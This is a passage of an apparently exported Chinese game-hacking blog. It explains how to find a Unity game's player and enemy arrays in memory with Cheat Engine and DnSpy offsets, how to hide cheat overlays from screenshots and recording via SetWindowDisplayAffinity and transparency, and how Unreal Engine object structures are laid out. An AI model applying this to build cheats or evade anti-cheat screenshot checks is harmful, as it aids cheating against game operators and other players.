src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>根据类名可以发现有两个可能是玩家类，经过两者内容对比，最终确认<strong>NewPlayerObject</strong>为玩家类。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>既然已经找到了玩家类，那么数找组就很容易了。同样的操作，对玩家类右键点分析，然后点击被使用，通过根据类名进行了一系列筛选后，判定<strong>NewPlayerManager</strong>为<strong>主管理类，而且为静态类。</strong></p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p>并且在该类下面也发现了很多数组。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>到这里，我们基本工作就已经完成了。到时候我们直接到游戏找到这个类然后通过DnSpy显示的偏移或Dump.cs显示的偏移拿到对应数组即可。</p>\n<p>上面我提到过，U3D的对象都会在自身下的某的地方存着该对象的类型，而且该偏移是固定的。那么这个偏移怎么找？我也不知道。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p>因为是当时偶然间在CE内存翻到的，然后去对比了其他游戏，发现偏移是固定的。目前只知道这个玩意叫做<strong>runtimeType.</strong></p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p>由于万物继承object，所以直接在头部翻就能找到了。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">Il2cpp：</span><br><span class=\"line\">        obj+<span class=\"number\">0x10</span>]=className</span><br><span class=\"line\">        obj+<span class=\"number\">0x18</span>]=spaceName</span><br><span class=\"line\">  Mono：</span><br><span class=\"line\">        obj+<span class=\"number\">0x0</span>]+<span class=\"number\">0x48</span>]=className</span><br><span class=\"line\">        obj+<span class=\"number\">0x0</span>]+<span class=\"number\">0x50</span>]=spaceName</span><br></pre></td></tr></table></figure>\n\n<p>这里说一个细节，在il2cpp中，className的内存属性是只读，Mono中是可读可写，然后就是className的后面紧接的字符串是该类的成员函数名和成员变量名，可以通过这个细节来筛选其他数据。</p>\n<p>进入游戏**(这里建议一定要进入游戏，因为进入游戏后才会有对象，有了对象才能方便我们查看数组对象)**，打开CE搜索我们找到的类NewPlayerManager。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p>这里只有一个结果，那么通过查看内存数据再对比DnSpy,发现该地址是正确的，然后开始做加减法。将该地址放到CE搜索<strong>（记得恢复查找的内存属性）。</strong></p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p>发现这里有两个，这个时候不要慌，都拿下来减0x10.</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p>第二个为0，u3d的对象头部不可能为0，这是经验之谈。这个时候0x 2E99B5E6060，实际上已经是NewPlayerManager的实例了，现在可以通过跟地址或者扫指针去找基地址，但是因为这个类是静态类所以这里直接搜索一下看看有没有基地址存着这个地址。有一个，那么这个就可以用了。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p>数据都找好了，现在就来看看数组吧，我们打开dump.cs，然后讲这个地址添加到ce的数据结构工具。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p>此时会存在一个问题，dump中显示0x10是一个字典，但是当先的0x10却是类名，那这就很尴尬。。这里在说一个点，也算是经验之谈。当前我们这个地址<strong>0x 2E99B5E6060，</strong>只能算是一个假体，真正实体在<strong>0xB8</strong>的位置，至于为什么，我也不懂，分析多了，见多了就默认了。我们进入<strong>0xB8</strong>的位置.</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p>发现现在数据相似度已经很高了。我们直接去看看怪物的数组<strong>（0x48）</strong></p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p><strong>进去后0x10是数组指针，0x18为数量，这是List固定的，然后进入0x10。</strong></p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p>同样数组是从0x20开始的，也是固定的。这些其实不是说我在瞎说，因为U3D的List他内存结构就是这样的。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<p>当前敌人也只有一个，然后0x20的指针，类名也是NewPlayerObject。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId28.png\" alt=\"document_image_rId28\"></p>\n<p>然后剩下的，就是查看dump.cs去拿到对应偏移即可。</p>\n<h3 id=\"补充一下\"><a href=\"#补充一下\" class=\"headerlink\" title=\"补充一下\"></a>补充一下</h3><p>在NewPlayerManager类中由于该类直接是继承object，所以该类的0x10直接是类名。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId29.png\" alt=\"document_image_rId29\"></p>\n<p>但是像NewPlayerObject类基类并不是object，所以需要在0x0的地方读一层之后0x10的位置才是类名。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId30.png\" alt=\"document_image_rId30\"></p>\n<p>因为是文字叙述，无法将所有细节给描述出来。所以大部分东西直接一笔带过，至于为什么，多去实践就知道了。这次针对的是il2cpp，所以在其他也是il2cpp的游戏中可能操作起来的相似度较高，Mono上可能有一些差异，但并不碍事，我只是想说有那么个方法可以快速拿到数据而已，至于能不能做到看自己的造化。文章中难免出现先一些错误，各位就留点情面吧。</p>\n<p>这大概也是我最后一次写这种类型的技术文了。。留个纪念吧。</p>\n<p><img src=\"/../images/GameHacker/%E5%88%A9%E7%94%A8U3D%E5%BC%95%E6%93%8E%E7%89%B9%E6%80%A7%E5%BF%AB%E9%80%92%E5%AE%9A%E4%BD%8D%E6%95%B0%E7%BB%84/document_image_rId31.png\" alt=\"document_image_rId31\"></p>\n","categories":["GameHacker"]},{"title":"反截图技术的原理及简单实现","url":"/2024/04/21/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/","content":"<ul>\n<li><a href=\"https://bbs.pediy.com/user-home-826671.htm\">PlaneJun</a> ・2020-10-15 12:32</li>\n</ul>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>该文章将邀请世界第一的编程语言-易语言来为我们演示。</p>\n<h1 id=\"吹逼\"><a href=\"#吹逼\" class=\"headerlink\" title=\"吹逼\"></a>吹逼</h1><p>随着好玩的游戏越来越多，盖佬人才越来越突出，好玩的游戏+一款牛逼的WG成为了一个老挂逼的日常生活。鲁迅说过‘有乐同享，有难同当‘，于是乎，老挂逼们开始投身于直播行业，以‘高超’的技术，来向大众传递游戏胜利的快乐。为了防止大众偷学到自己的技术，一种技术诞生了-反截图。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<h1 id=\"啥叫反截图\"><a href=\"#啥叫反截图\" class=\"headerlink\" title=\"啥叫反截图\"></a>啥叫反截图</h1><p>顾名思义，就是让你截取不到你想截取的图片呗。这时聪明人又来了，那我直接把截图函数全部干掉不就完事了吗？</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>emmm,虽然是这么个理，但是你确定你干得来吗。</p>\n<h1 id=\"为什么要反截图\"><a href=\"#为什么要反截图\" class=\"headerlink\" title=\"为什么要反截图\"></a>为什么要反截图</h1><p>直播、装逼、防止一些有截图检测的游戏</p>\n<h1 id=\"实现一个简单反截图\"><a href=\"#实现一个简单反截图\" class=\"headerlink\" title=\"实现一个简单反截图\"></a>实现一个简单反截图</h1><p>这个简单啊，打钱就完事。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>咳咳，开个玩笑。上才艺</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p>看不懂没关系，会用就行。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p>这样就OK，然后咱们运行后看一下截图效果</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p>我们发现，窗口变黑了。这是一个简单的反截图效果，虽然能反截图了，但是是个人都觉得这种反截图不靠谱。假设你正在用科技直播，观众全部就看着黑框了。而且，咱们自己都觉得这种反截图效果不行，那游戏公司还会傻吗？不给你一个套餐，难道留着回家过年吗。</p>\n<p>那么问题来了，当前这个黑框是覆盖在我们窗口上面呢，还是他把窗口直接变成黑色。接下来开始探究。</p>\n<h1 id=\"探究反截图原理\"><a href=\"#探究反截图原理\" class=\"headerlink\" title=\"探究反截图原理\"></a>探究反截图原理</h1><p>那么我们能不能实现一个全透明的反截图效果呢，比如B覆盖在A上面，我们截图，只能截取到A，B就完全处于一个透明的状态。答案是肯定的。接下来我们来进一步研究一下，既然我们想让他透明，好办啊，我们给窗口设置一个透明。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>运行起来之后，发现窗口透明了</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p>那我们来重新截图试试看。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<p>诶，我们发现刚刚那个反截图的效果，也变透明了。我们添加一个控件再运行截图看看效果。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p>我们发现，看不到按钮。经过这样的测试我们发现，SetWindowDisplayAffinity 这个函数之后所产生的黑框，并不是覆盖上去的，而是直接把窗口刷新成为黑色的，而且这种黑色的效果可以通过修改窗口透明度来控制黑色的可见度。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p>由此可知，一个新的反截图思路：给窗体一个透明度，这样就实现了全透明的反截图。当然还有另一种方法：论坛已经给出，<a href=\"https://bbs.pediy.com/thread-258830.htm\">https://bbs.pediy.com/thread-258830.htm</a></p>\n<p>Ok.下面开始根据第一种方法实现反截图(嘴角开始上扬)。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<h1 id=\"优化反截图\"><a href=\"#优化反截图\" class=\"headerlink\" title=\"优化反截图\"></a>优化反截图</h1><p>其实在上面我们已经实现了全透明的反截图，只不过用的是易语言官方库的命令(易语言真是世界上最好用的语言呢)，现在用API实现。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p>用这个函数设置就行，第一个参数句柄，第四个参数：1则用crKey，忽略bAlpha；2则用bAlpha，忽略crKey。这个函数干嘛的呢，就是设置窗口透明度的。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p>下面为了方便演示，我在窗口写了字，看看效果。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p>截图看一下效果</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p>这样的话，就实现了一个简单的反截图。如果想要实现效果更好的，可以到我上面指出的帖子里看看实现方法。</p>\n<p>下面是我将此技术运用在D3D透明绘制上</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p>截图后</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<h1 id=\"结束语\"><a href=\"#结束语\" class=\"headerlink\" title=\"结束语\"></a>结束语</h1><p>本篇文章只是探究一个低级的反截图，该反截图的原理也是我再某论坛看到的，虽说开源，但是却是调用DLL。凭着正义心驱使的我岂能让这种作为猖狂，直接扔进OD瞎操作，最后得知原理。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p>另外该种方法还能过录制。行了，这几天事务繁忙，突然有空就分析了一下反截图，然后就顺便来看雪划了水，溜了溜了。</p>\n<p><img src=\"/../images/GameHacker/%E5%8F%8D%E6%88%AA%E5%9B%BE%E6%8A%80%E6%9C%AF%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n","categories":["GameHacker"]},{"title":"四、认识结构并手动解析","url":"/2024/04/21/%E5%9B%9B%E3%80%81%E8%AE%A4%E8%AF%86%E7%BB%93%E6%9E%84%E5%B9%B6%E6%89%8B%E5%8A%A8%E8%A7%A3%E6%9E%90/","content":"<h1 id=\"一、-认识结构\"><a href=\"#一、-认识结构\" class=\"headerlink\" title=\"一、 认识结构\"></a>一、 认识结构</h1><ul>\n<li><strong>UObject</strong></li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UObject</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"comment\">/** virtual function table */</span></span><br><span class=\"line\"><span class=\"type\">void</span>* vtf; </span><br><span class=\"line\"><span class=\"comment\">/** Flags used to track and report various object states. This needs to be 8 byte aligned on 32-bit</span></span><br><span class=\"line\"><span class=\"comment\">  platforms to reduce memory waste */</span></span><br><span class=\"line\">  EObjectFlags                    ObjectFlags;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">/** Index into GObjectArray...very private. */</span></span><br><span class=\"line\">  int32                            InternalIndex;                <span class=\"comment\">//表明该对象在GObjectArray中的第几个</span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">/** Class the object belongs to. */</span></span><br><span class=\"line\">  UClass*                            ClassPrivate;        <span class=\"comment\">//对象所属的基类</span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">/** Name of this object */</span></span><br><span class=\"line\">  FName                            NamePrivate;           <span class=\"comment\">//类名</span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">/** Object this object resides in. */</span>   </span><br><span class=\"line\">  UObject*                        OuterPrivate;      <span class=\"comment\">//这个对象是从哪个对象来的</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>UField</strong></li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UField</span> : <span class=\"keyword\">public</span> UObject</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">  <span class=\"comment\">/** Next Field in the linked list */</span></span><br><span class=\"line\">    UField* Next;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>UEnum</strong></li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UEnum</span> : <span class=\"keyword\">public</span> UField</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\"><span class=\"comment\">/** How this enum is declared in C++, affects the internal naming of enum values */</span></span><br><span class=\"line\"><span class=\"keyword\">enum class</span> <span class=\"title class_\">ECppForm</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Regular, <span class=\"comment\">//0</span></span><br><span class=\"line\">    Namespaced, <span class=\"comment\">//1</span></span><br><span class=\"line\">    EnumClass <span class=\"comment\">///2</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;br/&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">/** 枚举类型的字符串, e.g. &quot;ENamespacedEnum::InnerType&quot; or &quot;ERegularEnum&quot; or &quot;EEnumClass&quot; */</span></span><br><span class=\"line\">FString CppType;</span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;br/&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">/**枚举成员. */</span></span><br><span class=\"line\">TArray&lt;TPair&lt;FName, int64&gt;&gt; Names;</span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;br/&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">/** 枚举的最初定义类型. */</span></span><br><span class=\"line\">ECppForm CppForm;</span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;br/&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">/** pointer to function used to look up the enum&#x27;s display name. Currently only assigned for UEnums generated for nativized blueprints */</span></span><br><span class=\"line\">FEnumDisplayNameFn EnumDisplayNameFn;</span><br><span class=\"line\">  </span><br><span class=\"line\">  &lt;br/&gt;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">/** global list of all value names used by all enums in memory, used for property text import */</span></span><br><span class=\"line\"><span class=\"type\">static</span> TMap&lt;FName, UEnum*&gt; AllEnumNames;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>UStruct</strong></li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UStruct</span> : <span class=\"keyword\">public</span> UField</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/** 继承自的结构体，可以为空 */</span></span><br><span class=\"line\">    UStruct* SuperStruct;</span><br><span class=\"line\">  <span class=\"comment\">/** 指向下一个子对象的指针 */</span></span><br><span class=\"line\">    UField* Children;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/** 该结构体的总大小 */</span></span><br><span class=\"line\">    int32 PropertiesSize;</span><br><span class=\"line\">    <span class=\"comment\">/** 结构体的对齐大小 */</span></span><br><span class=\"line\">    int32 MinAlignment;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/** Script bytecode associated with this object */</span></span><br><span class=\"line\">    TArray&lt;uint8&gt; Script;</span><br><span class=\"line\">    <span class=\"comment\">/** In memory only: Linked list of properties from most-derived to base */</span></span><br><span class=\"line\">    UProperty* PropertyLink;</span><br><span class=\"line\">    <span class=\"comment\">/** In memory only: Linked list of object reference properties from most-derived to base */</span></span><br><span class=\"line\">    UProperty* RefLink;</span><br><span class=\"line\">    <span class=\"comment\">/** In memory only: Linked list of properties requiring destruction. Note this does not include things that will be destroyed byt he native destructor */</span></span><br><span class=\"line\">    UProperty* DestructorLink;</span><br><span class=\"line\">    <span class=\"comment\">/** In memory only: Linked list of properties requiring post constructor initialization */</span></span><br><span class=\"line\">    UProperty* PostConstructLink;</span><br><span class=\"line\">    <span class=\"comment\">/** Array of object references embedded in script code. Mirrored for easy access by realtime garbage collection code */</span></span><br><span class=\"line\">    TArray&lt;UObject*&gt; ScriptObjectReferences;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>UFunction</strong></li>\n</ul>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">UFunction</span> : <span class=\"keyword\">public</span> UStruct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">  <span class=\"comment\">// Persistent variables.</span></span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">/** EFunctionFlags set defined for this function */</span></span><br><span class=\"line\">  EFunctionFlags FunctionFlags;</span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"comment\">// Variables in memory only.</span></span><br><span class=\"line\">  <span class=\"comment\">/** 参数数量 */</span></span><br><span class=\"line\">  uint8 NumParms;</span><br><span class=\"line\">  <span class=\"comment\">/** 所有参数的总大小 */</span></span><br><span class=\"line\">  uint16 ParmsSize;</span><br><span class=\"line\">  <span class=\"comment\">/** 返回值的偏移 */</span></span><br><span class=\"line\">  uint16 ReturnValueOffset;</span><br><span class=\"line\">  <span class=\"comment\">/** Id of this RPC function call (must be FUNC_Net &amp; (FUNC_NetService|FUNC_NetResponse)) */</span></span><br><span class=\"line\">  uint16 RPCId;</span><br><span class=\"line\">  <span class=\"comment\">/** Id of the corresponding response call (must be FUNC_Net &amp; FUNC_NetService) 